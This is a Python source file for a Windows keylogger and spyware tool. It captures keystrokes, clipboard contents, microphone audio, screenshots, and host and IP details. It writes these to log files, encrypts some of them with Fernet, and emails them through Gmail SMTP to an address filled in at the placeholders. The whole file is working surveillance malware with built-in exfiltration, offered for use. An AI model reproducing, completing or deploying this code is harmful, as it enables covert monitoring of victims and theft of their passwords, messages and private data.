from email.mime.multipart import MIMEMultipart   #for email
from email.mime.text import MIMEText               #for email
from email.mime.base import MIMEBase                  #for email
from email import encoders                           #for email
import smtplib                                     #for email
      
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener     #for basic keylogging

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd                                #for audio files

from cryptography.fernet import Fernet 

from multiprocessing import Process, freeze_support     
from PIL import ImageGrab                              #for taking screenshot


#########################################################end of Libraries######################################


#default variables
keys_info = "key_log.txt"
sys_info = "systeminfo.txt"
clipboard_info = "clipboardinfo.txt"
screenshot_info = "screenshot.png"
audio_info = "audio.wav"

keys_info_e = "e_key_log.txt"
sys_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboardinfo.txt"

file_path = "your file path where you wan to send all data"      #escape sequence
extend = "\\"
file_merge = file_path + extend

microphone_time = 1

key = "Key generated from generatekey.py"

email_address = "your mail id"
password = "your password"
toaddr = "receivers mail id"

time_iteration = 10
number_of_iterations_end = 5

##############################################start of email functionality###########################################


def send_mail(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()                           # instance of MIMEMultipart
    
    msg['From'] = fromaddr                                  # storing the senders email address
  
    msg['To'] = toaddr               # storing the receivers email address
     
    msg['Subject'] = "Log_files"                   # storing the subject 
  
    body = "log files"                # string to store the body of the mail
  
    msg.attach(MIMEText(body, 'plain'))             # attach the body with the msg instance
   
    filename = filename                   # open the file to be sent
    attachment = open(attachment, "r+b")
  
    p = MIMEBase('application', 'octet-stream')             # instance of MIMEBase and named as p
  
    p.set_payload((attachment).read())                        # To change the payload into encoded form
  
    encoders.encode_base64(p)                                       # encode into base64
   
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
  
    msg.attach(p)                  # attach the instance 'p' to instance 'msg'
  
    s = smtplib.SMTP('smtp.gmail.com', 587)              # creates SMTP session
  
    s.starttls()                           # start TLS for security
  
    s.login(fromaddr, password)                     # Authentication
  
    text = msg.as_string()                       # Converts the Multipart msg into a string
  
    s.sendmail(fromaddr, toaddr, text)                         # sending the mail
  
    s.quit()                                     # terminating the session

#now call the function 


''' 
#sometimes it will throw you error of SMTPAuthenticationError   
#for this type of problem go to your google security settings and then enable activity from less secure apps
#this will solve your issue
'''

#########################################end of email functionality#################################################



##########################################start of computer info #####################################################



def computer_info():

    with open(file_path + extend + sys_info, "a") as f:
        hostname = socket.gethostname()                  #To get Ip address of the system
        ipaddr = socket.gethostbyname(hostname)
        
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address : " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP address   ")

        f.write("Processor : " + (platform.processor())+ "\n")    #to get the processor in formation

        f.write("system : " + platform.system() + " " + platform.version() + "\n")     #to get the system info 

        f.write("Machine : " + platform.machine() + "\n")    #to get the machine information

        f.write("Hostname : " + hostname + "\n")    # it will print the hostname from above

        f.write("Private IP address :" + ipaddr + "\n")               # print the value from ipaddr
 


##########################################end  of computer info section####################################

#########################################start of clipboard info########################################

def clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        
        try:
            win32clipboard.OpenClipboard()
            paste = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data : \n " + paste)
        except:
            f.write("Clipboard could not be copied")

###########################################end of clipboard info########################################

#####################################start of microphone function##################################

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_info, fs, myrecording)

microphone()


######################################end of microphone function###########################################

######################################start of screenshot function##########################################

def screenshot():

    im = ImageGrab.grab()
    calll = "screenshot%s.png" %int(time.time())
    fname = file_path + extend + "images" + extend + calll
    im.save(fname,'PNG')

########################################end of screenshot function##########################################

##############################start of timer functionality and basic keylogger ######################################
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def press(key): 
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count>= 1:
            count = 0
            write1(keys)
            keys = []

    def write1(keys):
        with open(file_path + extend + keys_info , "a") as f:
            for key in keys: 
                k = str(key).replace("'","")    #to remove all the single quotes and blank spaces
                if k.find("space") > 0:         #if there is a space then instead of key.space it will print "new line" 
                    f.write(' ')
                elif k.find("enter") > 0:       #if user presses enter button it will go to the next line instead of giving input as key.enter
                    f.write('\n')
                elif k.find("tab")>0:           #if user presses tab then it will give "   " instead of key.tab
                    f.write('   ')
                elif k.find("Key") == -1:
                    f.write(k)

    def release(key):                           #this function is for esc. the program

        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

            

    with Listener(on_press =press, on_release =release) as listener:
        listener.join()

    send_mail(keys_info, file_path + extend + keys_info, toaddr)
   
    if currentTime > stoppingTime:
        with open(file_path + extend + keys_info, "a") as f:
            f.write(" ")

        screenshot()
        #send_mail(screenshot_info, file_path + extend + "images" + extend+ screenshot_info, toaddr)
        computer_info()
        send_mail(sys_info, file_path + extend + sys_info, toaddr)
        clipboard()
        send_mail(clipboard_info, file_path + extend + clipboard_info, toaddr)

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration    
    

############################end of timer functionality and basic keylogger#############################################
    
############################################ Encryption part #########################################

encryption_file = [file_merge + sys_info, file_merge + clipboard_info, file_merge + keys_info]
encryption_file_name = [file_merge + sys_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e ]


count = 0
for encrypting_file in encryption_file:
    with open(encryption_file[count], "rb") as f:
        data = f.read()
        
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encryption_file_name[count], "wb") as f:
        f.write(encrypted)
    
    send_mail(encryption_file_name[count], encryption_file_name[count], toaddr)
    count += 1

time.sleep(120)
